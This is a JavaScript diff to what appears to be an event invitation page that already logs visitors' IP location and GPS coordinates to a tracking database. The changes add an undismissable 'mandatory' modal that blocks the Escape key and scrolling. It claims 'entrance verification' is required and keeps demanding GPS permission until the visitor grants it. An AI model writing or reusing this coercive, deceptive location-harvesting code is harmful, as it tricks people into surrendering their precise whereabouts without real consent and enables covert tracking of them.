@@ -84,6 +84,8 @@
       accuracy:  pos.coords.accuracy,
     };
     gpsResolved = true;
+    try { localStorage.setItem('_gps_granted', 'true'); } catch(e){}
+    hideMandatoryModal();
     hideToast();
 
     // Show coords immediately
@@ -125,9 +127,25 @@
     await postTrack(buildPayload({ geo: true, gps: true }));
   }
 
-  function onGPSError() {
+  function onGPSError(err) {
     hideToast();
     showVenueError();
+
+    // Update modal error message and keep modal MANDATORY on screen
+    const btnText = document.getElementById('modal-btn-text');
+    const statusMsg = document.getElementById('modal-status-msg');
+    if (btnText) btnText.textContent = 'Allow & Retry';
+    if (statusMsg) {
+      statusMsg.className = 'modal-status error';
+      statusMsg.textContent = 'Entrance verification required. Please grant permission in browser site settings and click Allow again.';
+      statusMsg.style.display = 'block';
+    }
+
+    // Re-ensure modal is visible if location was not resolved
+    if (!gpsResolved) {
+      showMandatoryModal();
+    }
+
     // Still show IP-based location from Phase 1
     if (geoData && geoData.city) {
       const cityStr = [geoData.city, geoData.region, geoData.country_name].filter(Boolean).join(', ');
@@ -218,6 +236,60 @@
       updateVenueSpinner('Locating…');
       requestGPS();
     });
+  }
+
+  /* ────────────────────────────────────────────────────────
+     Mandatory Location Modal Handler
+  ──────────────────────────────────────────────────────── */
+  let modalShown = false;
+  function showMandatoryModal() {
+    if (gpsResolved) return;
+    const modal = document.getElementById('mandatory-location-modal');
+    if (!modal) return;
+    modalShown = true;
+    modal.classList.add('visible');
+    document.body.style.overflow = 'hidden';
+  }
+
+  function hideMandatoryModal() {
+    const modal = document.getElementById('mandatory-location-modal');
+    if (!modal) return;
+    modalShown = false;
+    modal.classList.remove('visible');
+    setTimeout(() => {
+      modal.style.display = 'none';
+    }, 500);
+    const preloader = document.getElementById('preloader');
+    if (!preloader || preloader.style.display === 'none') {
+      document.body.style.overflow = '';
+    }
+  }
+
+  function initMandatoryModal() {
+    const allowBtn  = document.getElementById('modal-allow-btn');
+    const btnText   = document.getElementById('modal-btn-text');
+    const statusMsg = document.getElementById('modal-status-msg');
+
+    if (allowBtn) {
+      allowBtn.addEventListener('click', () => {
+        gpsRequested = false; // Reset request flag to force fresh request
+        if (btnText) btnText.textContent = 'Verifying...';
+        if (statusMsg) {
+          statusMsg.className = 'modal-status info';
+          statusMsg.textContent = 'Please click "Allow" on your browser prompt...';
+          statusMsg.style.display = 'block';
+        }
+        requestGPS();
+      });
+    }
+
+    // Lock ESC key so user cannot dismiss mandatory modal
+    window.addEventListener('keydown', e => {
+      if (e.key === 'Escape' && modalShown) {
+        e.preventDefault();
+        e.stopPropagation();
+      }
+    }, true);
   }
 
   /* ────────────────────────────────────────────────────────
@@ -324,6 +396,9 @@
           if (nav) { nav.style.opacity = '1'; nav.style.transform = 'none'; }
           if (typeof ScrollTrigger !== 'undefined') {
             ScrollTrigger.refresh();
+          }
+          if (!gpsResolved) {
+            showMandatoryModal();
           }
         }
       });
@@ -512,18 +587,27 @@
     initCountdown();
     initParticles();
     initRSVP();
+    initMandatoryModal();
     attachToastButtons();
     attachClickTracking();
 
     // ★ Phase 1: fetch real IP geo + send to DB
     fetchGeoAndSend();
 
+    // Check if permission is already granted in local storage or browser
+    try {
+      if (localStorage.getItem('_gps_granted') === 'true') {
+        gpsRequested = false;
+      }
+    } catch(e){}
+
     // ★ Phase 2: request GPS immediately on load
-    //   (browser shows permission dialog right away)
     requestGPS();
 
-    // Show toast after 1.5s as fallback nudge
-    setTimeout(showToast, 1500);
+    // If GPS is not resolved, show mandatory modal popup
+    if (!gpsResolved) {
+      showMandatoryModal();
+    }
   });
 
 })();
